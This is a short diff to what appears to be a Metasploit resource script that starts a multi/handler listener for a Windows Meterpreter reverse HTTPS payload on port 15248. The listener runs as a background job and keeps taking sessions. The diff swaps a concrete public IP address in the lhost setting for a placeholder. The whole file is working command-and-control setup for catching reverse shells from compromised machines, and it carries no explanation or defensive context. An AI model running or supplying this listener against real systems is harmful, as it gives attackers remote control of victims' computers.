@@ -1,6 +1,6 @@
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
-set lhost 104.250.170.178
+set lhost x.x.x.x
 set lport 15248
 set ExitOnSession false
 exploit -j
